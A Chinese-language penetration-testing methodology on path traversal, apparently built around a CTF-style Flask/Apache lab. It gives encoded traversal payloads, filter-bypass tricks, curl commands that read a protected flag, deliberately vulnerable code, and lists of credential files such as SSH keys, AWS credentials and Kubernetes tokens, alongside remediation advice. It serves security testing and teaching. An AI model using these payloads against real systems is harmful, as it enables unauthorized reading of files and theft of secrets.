# 路径遍历攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的路径遍历（Path Traversal）漏洞检测与利用流程，帮助发现和利用文件系统访问控制缺陷，实现未授权文件读取和敏感信息窃取。

## 1.2 适用范围

本文档适用于所有接收文件路径参数、文件名参数的 Web 应用、API 接口，特别是那些提供文件下载、文件查看、静态资源服务等功能的应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

路径遍历漏洞（Path Traversal，CWE-22）是指应用程序对用户可控的文件路径参数未进行充分验证，导致攻击者能够通过目录遍历序列（如 `../`）访问预期目录之外的文件和目录。

**本质问题**：应用层代码将用户输入直接拼接到文件路径中，未进行适当的规范化、验证或限制，违背了"最小权限原则"。

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-22 | 路径遍历：`/../` 或 `/..` |
| CWE-23 | 相对路径遍历：`../` |
| CWE-59 | 符号链接跟随 |
| CWE-73 | 外部控制文件名或路径 |

### 漏洞分类

| 类型 | 描述 | 特点 |
|-----|------|------|
| 经典路径遍历 | 使用 `../` 遍历目录 | 最常见，易于检测 |
| 绝对路径遍历 | 直接使用绝对路径 | 需要知道目标路径 |
| 符号链接遍历 | 利用符号链接跳转 | 需要文件系统知识 |
| 编码绕过遍历 | URL 编码、Unicode 编码 | 绕过简单过滤 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 文件下载 | 下载文档/图片 | 文件名参数可控 |
| 静态资源服务 | 提供 CSS/JS/图片 | 资源路径可控 |
| 日志查看 | 查看系统/应用日志 | 日志文件路径可控 |
| 文件管理 | 文件浏览器 | 目录路径参数 |
| 图片查看 | 查看上传图片 | 图片路径参数 |
| 配置导出 | 导出配置文件 | 配置文件路径 |
| 备份下载 | 下载数据库备份 | 备份文件路径 |

### 案例分析

**场景描述**：Flask 应用提供 `/resource` 端点用于服务静态文件，但存在路径遍历漏洞。

**漏洞代码**：
```python
# File: routes.py lines 16-19
@app.route('/resource')
def resource():
    filename = request.args.get('filename')  # 无验证
    return send_from_directory('static', filename)  # 直接服务文件
```

**Apache 保护机制**：
```apache
# File: webapp-httpd.conf lines 24-27
<FilesMatch "^flag$">
    Order allow,deny
    deny from all
</FilesMatch>
```

**绕过方法**：Flask 端点不受 Apache FilesMatch 限制，直接访问 `/resource?filename=flag` 即可绕过保护。

## 2.3 漏洞探测方法

### 2.3.1 黑盒测试

**步骤 1：输入点识别**

识别所有可能接收文件路径的参数：
- `filename`, `file`, `path`, `filepath`
- `dir`, `directory`, `folder`
- `resource`, `asset`, `image`
- `log`, `config`, `backup`
- `download`, `export`

**步骤 2：基础探测 Payload**

```bash
# 基础遍历序列
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# Windows 路径
..\\..\\..\\Windows\\win.ini
..%5c..%5c..%5cWindows%5cwin.ini

# 混合路径
..\\..//..\\../etc/passwd
```

**步骤 3：响应分析**

观察以下响应特征判断漏洞存在：
- 返回 `/etc/passwd` 内容（Linux）
- 返回 `win.ini` 内容（Windows）
- 返回非预期的文件内容
- HTTP 状态码 200（而非 403/404）

### 2.3.2 编码绕过技术

**URL 编码**：
```bash
# 单编码
%2e%2e%2f  # ../
%2e%2e/    # ../
..%2f      # ../

# 双编码（绕过解码一次）
%252e%252e%252f  # 解码后为 ../

# Unicode 编码
\u002e\u002e\u002f  # ../
%c0%ae%c0%ae/       # 超集 UTF-8
```

**大小写混合（Windows）**：
```bash
..\\..\\..\\WINDOWS\\system32\\config\\SAM
..\\..\\..\\WiNdOwS\\win.ini
```

**长文件名绕过（Windows）**：
```bash
..\\..\\..\\C:\\boot.ini
...../...../...../etc/passwd
```

**路径分隔符变体**：
```bash
# Linux/Unix
../
..//
..\\
..//

# Windows
../
..\\
..//
```

### 2.3.3 白盒测试

**代码审计要点**：

```python
# ❌ 漏洞代码示例
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file('/var/www/files/' + filename)  # 直接拼接

# ❌ 漏洞代码示例 2
def serve_file(path):
    return open(path).read()  # 无验证

# ✅ 安全代码示例
from werkzeug.utils import secure_filename

@app.route('/download')
def download():
    filename = request.args.get('file')
    # 使用安全函数处理
    safe_filename = secure_filename(filename)
    return send_file('/var/www/files/' + safe_filename)

# ✅ 安全代码示例 2 - 白名单验证
ALLOWED_FILES = ['report.pdf', 'data.csv', 'image.png']

@app.route('/download')
def download():
    filename = request.args.get('file')
    if filename not in ALLOWED_FILES:
        abort(403)
    return send_file('/var/www/files/' + filename)
```

**危险函数列表**：

| 语言 | 危险函数 |
|-----|---------|
| Python | `open()`, `send_file()`, `send_from_directory()` |
| PHP | `file_get_contents()`, `readfile()`, `fopen()` |
| Java | `FileInputStream()`, `Files.readAllBytes()` |
| Node.js | `fs.readFile()`, `fs.readFileSync()` |
| Ruby | `File.read()`, `File.open()` |

## 2.4 漏洞利用方法

### 2.4.1 Linux 敏感文件读取

**系统配置文件**：
```bash
# 用户信息
/etc/passwd              # 所有用户账户
/etc/shadow              # 密码哈希（需要 root）
/etc/group               # 用户组信息
/etc/sudoers             # sudo 配置

# 系统配置
/etc/hosts               # 主机名映射
/etc/resolv.conf         # DNS 配置
/etc/hostname            # 主机名
/proc/version            # 内核版本
/proc/self/environ       # 环境变量

# 应用配置
/etc/apache2/apache2.conf    # Apache 配置
/etc/nginx/nginx.conf        # Nginx 配置
/etc/mysql/my.cnf           # MySQL 配置
```

**SSH 密钥**：
```bash
/root/.ssh/id_rsa            # root 私钥
/home/user/.ssh/id_rsa       # 用户私钥
/root/.ssh/authorized_keys   # 授权密钥
```

**历史命令**：
```bash
/root/.bash_history
/home/user/.bash_history
```

### 2.4.2 Windows 敏感文件读取

**系统文件**：
```bash
C:\\Windows\\win.ini              # Windows 初始化文件
C:\\Windows\\system.ini           # 系统配置
C:\\boot.ini                      # 启动配置（旧版本）
C:\\Windows\\System32\\config\\SAM  # SAM 数据库
```

**应用配置**：
```bash
C:\\inetpub\\wwwroot\\web.config    # IIS 配置
C:\\xampp\\phpMyAdmin\\config.inc.php
```

**用户数据**：
```bash
C:\\Users\\Administrator\\Desktop\\
C:\\Users\\Administrator\\Documents\\
```

### 2.4.3 云环境敏感文件

**AWS 凭证**：
```bash
~/.aws/credentials
/var/lib/jenkins/.aws/credentials
```

**Docker 相关**：
```bash
/var/run/docker.sock              # Docker 套接字
~/.docker/config.json             # Docker 配置
```

**Kubernetes**：
```bash
/var/run/secrets/kubernetes.io/serviceaccount/token
```

### 2.4.4 应用源码和配置

**常见 Web 应用路径**：
```bash
# Python/Flask
/app/__init__.py
/app/routes.py
/config.py
/.env
/config/settings.py

# PHP
/config.php
/wp-config.php
/application/config/database.php

# Java
/WEB-INF/web.xml
/WEB-INF/classes/application.properties
```

**数据库文件**：
```bash
/var/www/html/db.sqlite
/data/database.db
/backup/backup.sql
```

### 2.4.5 日志文件读取

**系统日志**：
```bash
/var/log/auth.log           # 认证日志（Debian/Ubuntu）
/var/log/secure             # 安全日志（RHEL/CentOS）
/var/log/syslog             # 系统日志
/var/log/messages           # 系统消息
```

**Web 服务器日志**：
```bash
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

**应用日志**：
```bash
/var/www/html/logs/app.log
/tmp/app.log
```

### 2.4.6 利用 Flask send_from_directory 绕过 Apache 保护

**场景描述**：Apache 配置 FilesMatch 阻止直接访问敏感文件，但 Flask 端点可绕过。

**完整利用链**：

```bash
# 步骤 1：识别 Apache 保护机制
curl -v http://target.com/static/flag
# 响应：403 Forbidden（Apache FilesMatch 生效）

# 步骤 2：测试 Flask 端点
curl -v http://target.com/resource?filename=flag
# 响应：200 OK，返回 flag 内容

# 步骤 3：获取 Flag
curl http://target.com/resource?filename=flag
# 输出：flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}
```

**原理分析**：
- Apache FilesMatch 仅作用于 Apache 直接服务的静态文件
- Flask 的 `send_from_directory()` 是 Python 代码执行的文件读取
- Flask 端点不受 Apache FilesMatch 规则限制

## 2.5 漏洞利用绕过方法

### 2.5.1 黑名单过滤绕过

**场景**：应用过滤 `../` 序列

**绕过方法 1：双写绕过**
```bash
# 如果过滤 ../
....//  # 解码后为 ../

# 如果过滤 ..%2f
..%252f  # 双编码
```

**绕过方法 2：混合分隔符**
```bash
..\\..//..\\../etc/passwd
..//..\\..//etc/passwd
```

**绕过方法 3：URL 编码变体**
```bash
%2e%2e%2f  # ../
%2e%2e/    # ../
..%2f      # ../
%2e%2e%5c  # ..\
```

**绕过方法 4：Unicode 编码**
```bash
\u002e\u002e\u002f  # ../
%c0%ae%c0%ae/       # 超集 UTF-8（旧系统）
```

### 2.5.2 前缀/后缀检查绕过

**场景**：应用检查路径必须以特定目录开头

**绕过方法 1：绝对路径**
```bash
# 如果检查必须以 /var/www/files 开头
/var/www/files/../../../etc/passwd
```

**绕过方法 2：符号链接**
```bash
# 如果存在符号链接指向敏感目录
/var/www/files/tmp -> /etc
# 访问
/var/www/files/tmp/passwd
```

**绕过方法 3：空字节注入（旧版本 PHP）**
```bash
/var/www/files/../../../etc/passwd%00.jpg
# 检查逻辑认为文件是 .jpg，实际访问 passwd
```

### 2.5.3 白名单绕过

**场景**：应用使用文件名白名单

**绕过方法 1：路径参数分离**
```bash
# 如果白名单检查 filename，但实际使用 filepath
filename=report.pdf&filepath=../../../etc/passwd
```

**绕过方法 2：二次解析漏洞**
```bash
# 某些框架会多次解析路径
....//....//etc/passwd
# 第一次解析：..//..//etc/passwd
# 第二次解析：../../etc/passwd
```

### 2.5.4 send_from_directory 特定绕过

**Flask 的 send_from_directory 保护机制**：
- 使用 `werkzeug.security.safe_join()` 进行路径规范化
- 拒绝包含 `..` 且会逃逸根目录的路径
- 但不会检查文件是否在预期子目录内

**绕过方法**：
```bash
# 方法 1：直接文件名（无目录遍历）
filename=flag

# 方法 2：当前目录引用
filename=./flag

# 方法 3：如果 static 目录包含子目录
filename=subdir/../../flag  # 可能绕过某些检查
```

### 2.5.5 无认证系统路径遍历利用

**场景描述**：当应用无认证机制时，所有端点公开访问。

**利用流程**：

```bash
# 步骤 1：确认无认证
curl -v http://target.com/resource
# 响应：200 OK（无 401/403/重定向）

# 步骤 2：枚举目录结构
curl http://target.com/static/
# 响应：目录列表（Options Indexes 启用）

# 步骤 3：识别保护文件
# 目录列表显示：flag, css/, js/
# 但直接访问 /static/flag 返回 403

# 步骤 4：利用 Flask 端点绕过
curl http://target.com/resource?filename=flag
# 响应：200 OK，返回 flag 内容
```

**关键发现**：
- 无认证系统所有端点可直接访问
- 目录列表泄露文件结构
- Apache FilesMatch 可被 Flask 端点绕过

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| 基础遍历 | `../../../etc/passwd` | Linux 用户文件 |
| Windows 遍历 | `..\\..\\..\\Windows\\win.ini` | Windows 系统文件 |
| URL 编码 | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` | 编码绕过 |
| 双编码 | `%252e%252e%252f` | 双编码绕过 |
| Unicode | `%c0%ae%c0%ae/` | 超集 UTF-8 |
| 混合分隔符 | `..\\..//..\\../etc/passwd` | 混合绕过 |
| 绝对路径 | `/etc/passwd` | 直接绝对路径 |
| 当前目录 | `./flag` | 当前目录文件 |
| Flask 绕过 | `filename=flag` | 直接文件名 |

## 3.2 敏感文件路径清单

**Linux 系统**：
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/resolv.conf
/proc/self/environ
/proc/version
/root/.ssh/id_rsa
/home/user/.bash_history
/var/log/auth.log
/var/log/apache2/access.log
```

**Windows 系统**：
```
C:\\Windows\\win.ini
C:\\Windows\\system.ini
C:\\boot.ini
C:\\Users\\Administrator\\Desktop\\
C:\\inetpub\\wwwroot\\web.config
```

**应用配置**：
```
/var/www/html/.env
/app/config/settings.py
/config/database.yml
WEB-INF/web.xml
```

## 3.3 自动化工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| dotdotpwn | 路径遍历模糊测试 | https://github.com/wireghoul/dotdotpwn |
| Burp Suite | 手动测试和扫描 | https://portswigger.net/burp |
| OWASP ZAP | 自动化扫描 | https://www.zaproxy.org/ |
| ffuf | 快速模糊测试 | https://github.com/ffuf/ffuf |

## 3.4 修复建议

**输入验证**：
1. 使用白名单验证允许的文件名
2. 移除所有路径遍历序列（`../`, `..\\`）
3. 使用 `secure_filename()` 等安全函数

**路径规范化**：
1. 使用 `os.path.realpath()` 解析真实路径
2. 验证解析后路径在预期目录内
3. 使用 `chroot` 或容器隔离

**最小权限原则**：
1. 应用使用最小必要权限运行
2. 敏感文件设置严格的文件权限
3. 使用 Web 服务器访问控制（如 Apache FilesMatch）

**架构设计**：
1. 避免直接暴露文件路径参数
2. 使用文件 ID 映射而非真实路径
3. 实施访问日志和监控

---

**参考资源**：
- [OWASP Cheat Sheet: Path Traversal](https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html)
- [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
